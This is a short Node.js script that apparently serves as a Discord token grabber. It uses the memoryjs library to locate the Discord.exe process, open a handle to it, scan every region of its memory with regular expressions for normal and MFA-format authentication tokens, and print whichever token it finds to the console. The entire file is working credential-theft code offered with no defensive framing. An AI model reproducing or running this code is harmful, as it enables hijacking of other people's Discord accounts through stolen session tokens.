const memoryjs = require("memoryjs");

const processName = "Discord.exe";
const processes = memoryjs.getProcesses();

let token = "";

let normal = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{38}/g)
let mfa = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{107}/g)

let procID = 0;
let found = false;

for (let i = 0; i < processes.length; i++) {
    if (processes[i].szExeFile == processName) {
        if (found == false) {
            console.log("succesfully found " + processes[i].szExeFile + " with pID " + processes[i].th32ProcessID);
            procID = processes[i].th32ProcessID;
            found = true;
        };
    };
};

console.log("getting process handle and base adres...");
const processObject = memoryjs.openProcess(procID);
console.log("succesfully retrieved handle " + processObject.handle + " and base adres " + processObject.modBaseAddr);
console.log("finding token in memory...")

let addr = 0;
while (true) {
    try {
        let query = memoryjs.virtualQueryEx(processObject.handle, addr);
        let string = memoryjs.readBuffer(processObject.handle, addr, query.RegionSize).toString();
        let ntoken = normal.exec(string);
        let mtoken = mfa.exec(string);

        if (ntoken) {
            token = ntoken[0];
        } else if (mtoken) {
            token = mtoken[0];
        };

        addr = query.BaseAddress + query.RegionSize;
    } catch (err) {
        console.log("succesfully retrieved token");
        break;
    };
};

console.log(token);
